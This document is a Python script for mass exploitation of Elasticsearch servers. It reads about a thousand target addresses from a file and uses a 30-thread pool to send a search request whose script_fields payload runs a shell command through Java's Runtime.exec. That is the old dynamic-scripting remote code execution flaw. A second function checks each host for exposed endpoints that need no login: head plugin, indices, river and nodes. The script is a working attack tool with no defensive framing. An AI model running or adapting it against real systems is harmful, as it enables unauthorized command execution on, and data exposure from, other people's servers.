import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
line_break = '\n'
file_path = Path(__file__).resolve().parent
result_path = file_path/'result'/'elasticsearchs.txt'

def exp(ip_,index):
    try:

        url_web = ip_+'/_search?pretty'
        payload={
            "size": 1,
            "query": {
            "filtered": {
                "query": {
                "match_all": {
                   }
                 }
              }
            },
            "script_fields": {
                "command": {
                    "script": 
        "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"ls /tmp\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                }
            }
        }
        
        # print(ip_)
        get_web = requests.post(url_web, data=payload,headers=headers,
                               timeout=8, verify=False)
        if get_web.status_code!=200:
            return

        print(get_web,len(get_web.text))
        # print(get_web.text)
        print(index, url_web)
        # with result_path.open('a+') as file:
        # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass



def exploit(ip_, index):
    try:

        url_web = ip_+'/_plugin/head/'
        url_indices = ip_+'/_cat/indices'
        url_search = ip_+'/_river/_search'
        url_nodes = ip_+'/_nodes'

        # print(ip_)
        get_web = requests.get(url_web, headers=headers,
                               timeout=8, verify=False)
        get_indices = requests.get(
            url_indices, headers=headers, timeout=8, verify=False)
        get_search = requests.get(url_search, headers=headers,
                                  timeout=8, verify=False)
        get_nodes = requests.get(url_nodes, headers=headers,
                                 timeout=8, verify=False)
        if get_web.status_code != 200 and get_indices.status_code != 200 and get_search.status_code != 200 and get_nodes.status_code != 200:
            return
        print(get_web, len(get_web.text))
        print(get_indices, len(get_indices.text))
        print(get_search, len(get_search.text))
        print(get_nodes, len(get_nodes.text))

        print(index, url_web)
        # with result_path.open('a+') as file:
        # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url)


threads = []
with open(r'D:\Downloads\tmp\elasticsearch.txt', 'r') as file:
    # with open(r'nfs.txt', 'r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 300
        end = start+1000

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exp, args=(ip, index,))
            threads.append(thread)
pool_size = 30
# print(urls)

test = 'm'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exp, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()
